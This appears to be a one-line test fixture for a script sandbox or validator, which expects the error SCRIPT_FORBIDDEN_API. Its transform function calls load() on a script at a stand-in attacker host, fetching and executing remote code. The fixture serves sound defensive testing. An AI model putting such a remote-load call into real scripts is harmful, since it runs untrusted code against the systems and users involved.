// expect: SCRIPT_FORBIDDEN_API
function transform(msg, ctx) { load('http://attacker.example/x.js'); return msg; }
